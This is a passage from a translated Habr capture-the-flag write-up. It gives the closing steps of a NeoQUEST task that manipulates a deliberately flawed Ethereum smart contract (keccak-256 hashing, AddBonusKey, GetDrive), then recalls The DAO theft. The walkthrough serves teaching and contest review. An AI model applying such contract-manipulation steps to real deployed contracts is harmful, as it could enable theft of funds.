of the contract are the same. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/5e2/658/fef/5e2658fef9b64315aa9fc10a70d483b0.png"></div><br><br>  The next step is to add a code to get the engine.  For this you need: <br><ol><li>  Take some set of bytes (for example, [0x01, 0x02, 0x03]). </li><li>  Calculate from him the hash keccak-256 (for this example, we get 0xf1885eda54b7a053318cd41e2093220dab15d65381b1157a3633a83bfd5c9239). </li><li>  Turn it over (0x39925cfd3ba833367a15b18153d615ab0d2293201ed48c3153a0b754da5e88f1). </li><li>  To present in the form of a decimal number (26040433828516858466028575311317889779993153936426418137092284197924182591729). </li><li>  Call AddBonusKey () by passing this number as a parameter. </li></ol><br>  For conversions you can, for example, use the <a href="https://pypi.python.org/pypi/pysha3">pysha3</a> library for Python. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/738/ca4/2a1/738ca42a1dee4c7bb432eea2b9034784.png"></div><br><br>  Finally, the added code needs to be used.  To do this, you can call <i><b>GetDrive ()</b></i> , transferring the bytes from which the code was created.  Voila, the spacecraft engine (and second key) are received! <br><br><h2>  <b>Finally</b> </h2><br>  Nowadays, the blockchain begins to be used in real life.  For example, it is used for <a href="https://storj.io/">decentralized</a> file <a href="https://storj.io/">storage</a> , <a href="https://geektimes.ru/company/wirex/blog/278618/">electronic voting</a> , and some banks issue <a href="https://geektimes.ru/company/hashflare/blog/275740/">special</a> cryptocurrency <a href="https://geektimes.ru/company/hashflare/blog/275740/">cards</a> . <br><br>  The blockchain guarantees the integrity of the data entered into it, but does not protect against errors in the underlying applications.  A good example is the <a href="https://geektimes.ru/post/277476/">attack on The DAO</a> , during which the attacker used an error in an organization‚Äôs smart contract to steal a huge amount of cryptocurrency (equivalent to $ 60 million).  This attack led to the death of The DAO and shook the stability of Ethereum.  Fortunately, the money was returned to their rightful owners.  Nevertheless, the incident stressed the importance of ensuring information security in the application of blockchain technology. <br><br>  We demonstrated the security problems associated with the use of cryptocurrency in one of the NeoQUEST tasks, and we very much hope that our participants have learned a lot in the process of passing the task and from this write-up!  By the way, while the <a href="https://2017.neoquest.ru/">site with tasks is</a> still available, those who have not completed the task can finally "finish off" it! </div><p>Source: <a href="https://habr.com/ru/post/324456/">https://habr.com/ru/post/324456/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../324444/index.html">We are inventing a name for the new hypervisor for MIPS architecture with hardware-supported virtualization</a></li>
<li><a href="../324446/index.html">Vkontakte made another breakthrough. For a short time, all users of the social network received moderator rights.</a></li>
<li><a href="../324448/index.html">Release Rust 1.16</a></li>
<li><a href="../324450/index.html">The policy of backward compatibility in the development framework for the example of Magento 2. Part 1</a></li>
<li><a href="../324454/index.html">Factors Affecting Failures and Conversions According to Artificial Intelligence</a></li>
<li><a href="../324458/index.html">Differences, advantages, disadvantages: public and private blockchains</a></li>
<li><a href="../324460/index.html">Intel launches first SSD with 3D Xpoint technology</a></li>
<li><a href="../324462/index.html">He tested the most famous methods of personal effectiveness and wrote one of the best books on productivity.</a></li>
<li><a href="../324464/index.html">How work was done to improve navigation in Uber</a></li>
<li><a href="../324466/index.html">Micro-optimizations are important: prevent 20 million system calls</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>